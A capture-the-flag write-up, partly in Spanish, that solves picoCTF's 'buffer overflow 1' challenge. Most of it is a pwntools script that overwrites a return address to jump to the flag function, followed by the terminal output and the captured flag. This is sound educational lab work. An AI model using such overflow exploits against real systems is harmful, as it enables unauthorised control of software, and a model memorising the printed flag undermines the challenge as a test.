Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/250/vuln). You can view source [here](https://artifacts.picoctf.net/c/250/vuln.c). And connect with it using `nc saturn.picoctf.net 61041`

Hints:
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

## Solución

------------------------------------------------------------------------
Podemos crear un código en python que nos ayude a romper la liga y obtener la bandera

``` python
from pwn import *

p = remote('saturn.picoctf.net', 51605)

overflow = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'

print( p.recvuntil(':') )

p.sendline(overflow)

p.interactive()


```

``` bash
holiwiscach@ubuntu:~/buffer_overflow1$ python3 exp.py 
[+] Opening connection to saturn.picoctf.net on port 51605: Done
/home/holiwiscach/Escritorio/Seguridad/picoCTF/binary/buffer_overflow1/exp.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print( p.recvuntil(':') )
b'Please enter your string:'
/home/holiwiscach/buffer_overflow1/exp.py:9: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(overflow)
[*] Switching to interactive mode
 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
```

bandera:
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}